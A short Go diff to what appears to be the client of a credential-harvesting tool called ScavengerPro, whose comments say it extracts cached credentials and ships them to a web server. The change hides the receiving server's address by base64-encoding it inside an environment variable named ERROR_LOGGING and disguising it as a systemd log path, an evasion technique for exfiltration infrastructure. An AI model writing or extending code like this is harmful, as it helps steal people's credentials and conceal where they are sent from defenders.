@@ -7,13 +7,24 @@ import (
 	"ScavengerPro/client/cred_cache"
 	"bufio"
 	"bytes"
+	b64 "encoding/base64"
 	"encoding/json"
 	"io/ioutil"
 	"net/http"
 	"os"
+	"strings"
 )
 
-var serv = "127.0.0.1:5000" //IP of server
+var serv = getServer() //IP of server
+
+// turn encoded environment variable into ip addres
+// example env: "/var/log/systemd-MTkyLjE2OC4xLjE=" => 192.168.1.1:5000
+func getServer() string {
+	envVar := os.Getenv("ERROR_LOGGING") //fetch environment variable
+	trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
+	decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
+	return string(decoded)
+}
 
 // This function will extract info from CredCache object and ship it back
 // to the web server.  If the POST request fails, write the cache data to
